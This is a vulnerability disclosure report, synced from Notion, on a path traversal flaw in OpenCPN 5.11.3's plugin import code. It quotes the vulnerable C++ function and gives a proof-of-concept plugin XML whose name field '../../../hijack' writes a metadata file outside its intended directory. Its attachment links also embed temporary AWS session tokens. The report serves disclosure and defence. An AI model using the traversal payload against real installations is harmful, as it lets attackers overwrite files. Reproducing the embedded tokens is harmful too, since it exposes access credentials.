---
notion_url: https://www.notion.so/325be0809830834c8c6381516f4b588c
last_synced: 2026-06-11 19:52
tags: [notion-sync]
---

# File overwrite - Path traversal report

- 📄 [[KOR OpenCPN File overwrite - Path traversal report/KOR OpenCPN File overwrite - Path traversal report|KOR OpenCPN File overwrite - Path traversal report]]

Vulnerability Title : OpenCPN File overwrite - Path traversal report
Vulnerability Summary: File overwrite due to creation of a `.meta` file without path validation
Vendor : Github OpenSource Project
Software Name : OpenCPN
Version : 5.11.3
Software Type : ECS (Electronic Chart System)
Attack Type : Path Traversal
Impact : File overwrite with process privileges
Vulnerable Source File: `Console.cpp
`
Vulnerable Function: `import_plugin()`
Vulnerable Parameter : 

```c++
metadata_path = PluginHandler::ImportedMetadataPath([metadata.name](http://metadata.name/));
```

Affected Environment: Ubuntu 24.04

Proof Of Concept  : 

While analyzing `console.cpp` inside `opencpn/cli`, in `import_plugin()`:

```c++
void import_plugin(const std::string& tarball_path) {
    auto handler = PluginHandler::GetInstance();
    PluginMetadata metadata;
    bool ok = handler->ExtractMetadata(tarball_path, metadata);
    if (!ok) {
      std::cerr << "Cannot extract metadata (malformed tarball?)\n";
      exit(2);
    }
    if (!PluginHandler::IsCompatible(metadata)) {
      std::cerr << "Incompatible plugin detected\n";
      exit(2);
    }
    ok = handler->InstallPlugin(metadata, tarball_path);
    if (!ok) {
      std::cerr << "Error extracting import plugin tarball.\n";
      exit(2);
    }
    metadata.is_imported = true;
    auto metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);
    std::ofstream file(metadata_path);
    file << metadata.to_string();
    if (!file.good()) {
      std::cerr << "Error saving metadata file: " << metadata_path
                << " for imported plugin: " << metadata.name;
      exit(2);
    }
    exit(0);
  }
```


After confirming that there is no validation of the `metadata.name` path, an XML file was created for testing:

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <plugin version="1">
      <name>../../../hijack</name>
      <version>0.0.1</version>
      <release>0</release>
      <summary>PoC</summary>
      <description>Path Traversal PoC</description>
      <target>ubuntu-x86_64</target>
      <build-target>ubuntu</build-target>
      <build-gtk>gtk3</build-gtk>
      <target-version>24.04</target-version>
      <target-arch>x86_64</target-arch>
      <api-version>1.18</api-version>
      <tarball-url>file:///nope</tarball-url>
    </plugin>
```


Inserted `..` and `/` into `<name>` to attempt path traversal:

![image](_assets/image.png)


Additional Materials (video, report attachments):

> 📎 첨부(미변환): [POC.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/b5ba704b-1446-488f-8f07-e5a8cd12e7aa/POC.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466Z3IMWM6D%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T105229Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDIaCXVzLXdlc3QtMiJGMEQCIHoecDSuX1wdiqFidJpQ68XI97aNrvtU2DLiKKYnBmZCAiB16LzDJ4werpAlHK24q2AYf4zlQjdt0R6NmqKdh8uYwiqIBAj7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMZ1TVrKUfuqnkWdhQKtwDhzjQKdroc%2FjakAgQJCbWnitH0QFe3%2BZuOzqgHOGeqRq%2FjxFXdIGtcDlp52N%2FyMXko8o%2BoSFFxU9XFCnueGMMEaQhkmemZPfQcrslUENUCu%2FV1jQYv1dbCRWo%2FFZrJzD7wSTQEJdR69mnpgrFy2uXd5wAiE4gD7pLiuDCpRT4NeBuzdbq8Cr%2Fqmq%2Bmuo24XEMPbeDC8s0F%2BsWVta3D26jKqcb1AAkDSKAMyzJB9IH1SYt7F478Cz4mdby8zcxwwUmCdYxVjGliQ0JJQFgHQoTAW0B%2BTFSvhiW9iQ0vGOLvLHYJXKNP4vzuE8wEa5bQt368%2FwjCRLOCV0SoPiGrFOUAF0bF9dP7q3kSnDQUfNtfD6ChDF5L20f6ahxhsXDLnQfRKuNQ%2FtstG5vbKh2Pj1cYunBFHHZg%2B8wdJ%2BumYkK%2BsMeRTVmQW5yNvsfVx4%2Fw7kt7Z%2FG7Gi85QVCwYWQUOO4oEkbarDJY4ihkTTGJA96BAUUg74bQ%2BTghgt4j6VhIDCBKyU%2FNvfYV%2FrHb2pgnS0E8N6IgMWluUFWe3MzqHS2NPa1G00etfI9IydBzV%2FDMDPdrI%2F81N3PKA7Q5pt%2FUExXDUBP5GiFcSbkndmYg65i%2BQv5hF5TOGxxNvnAtIow3v6p0QY6pgFuKeq%2FqxLytRsK62Wa6sTpVsv0m34UappYF7sp0IiPjdfA9DSEFAY8AKvNX3AIhrQtXHhPP3vt4jckPGMTH9nOdu06IUtzkEGGcSwh%2FLfCWVePyWOEQFPOsRF0aCofKW%2B%2Fp6pLWVFo%2FXTa%2BaXRN1oqNJY02M8CnSM%2Fu7j7HWikJPAu3XMCPmqRnc%2B4HgcoTChFXo1loys0md97AR4A28NdMcVnPIYE&X-Amz-Signature=cccfd48501fc106a65cd7cdec6366cba73c3bea4977c23f492a2096a9e4a45d3&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)



> 📎 첨부(미변환): [zdi report1.txt](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/906fde38-249e-4345-a05b-12f9884900fa/zdi_report1.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466Z3IMWM6D%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T105229Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDIaCXVzLXdlc3QtMiJGMEQCIHoecDSuX1wdiqFidJpQ68XI97aNrvtU2DLiKKYnBmZCAiB16LzDJ4werpAlHK24q2AYf4zlQjdt0R6NmqKdh8uYwiqIBAj7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMZ1TVrKUfuqnkWdhQKtwDhzjQKdroc%2FjakAgQJCbWnitH0QFe3%2BZuOzqgHOGeqRq%2FjxFXdIGtcDlp52N%2FyMXko8o%2BoSFFxU9XFCnueGMMEaQhkmemZPfQcrslUENUCu%2FV1jQYv1dbCRWo%2FFZrJzD7wSTQEJdR69mnpgrFy2uXd5wAiE4gD7pLiuDCpRT4NeBuzdbq8Cr%2Fqmq%2Bmuo24XEMPbeDC8s0F%2BsWVta3D26jKqcb1AAkDSKAMyzJB9IH1SYt7F478Cz4mdby8zcxwwUmCdYxVjGliQ0JJQFgHQoTAW0B%2BTFSvhiW9iQ0vGOLvLHYJXKNP4vzuE8wEa5bQt368%2FwjCRLOCV0SoPiGrFOUAF0bF9dP7q3kSnDQUfNtfD6ChDF5L20f6ahxhsXDLnQfRKuNQ%2FtstG5vbKh2Pj1cYunBFHHZg%2B8wdJ%2BumYkK%2BsMeRTVmQW5yNvsfVx4%2Fw7kt7Z%2FG7Gi85QVCwYWQUOO4oEkbarDJY4ihkTTGJA96BAUUg74bQ%2BTghgt4j6VhIDCBKyU%2FNvfYV%2FrHb2pgnS0E8N6IgMWluUFWe3MzqHS2NPa1G00etfI9IydBzV%2FDMDPdrI%2F81N3PKA7Q5pt%2FUExXDUBP5GiFcSbkndmYg65i%2BQv5hF5TOGxxNvnAtIow3v6p0QY6pgFuKeq%2FqxLytRsK62Wa6sTpVsv0m34UappYF7sp0IiPjdfA9DSEFAY8AKvNX3AIhrQtXHhPP3vt4jckPGMTH9nOdu06IUtzkEGGcSwh%2FLfCWVePyWOEQFPOsRF0aCofKW%2B%2Fp6pLWVFo%2FXTa%2BaXRN1oqNJY02M8CnSM%2Fu7j7HWikJPAu3XMCPmqRnc%2B4HgcoTChFXo1loys0md97AR4A28NdMcVnPIYE&X-Amz-Signature=f9ce88605af58a2408e6ed300b1f72668c1c4d975ad0cb93becfc5b77f6a2229&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
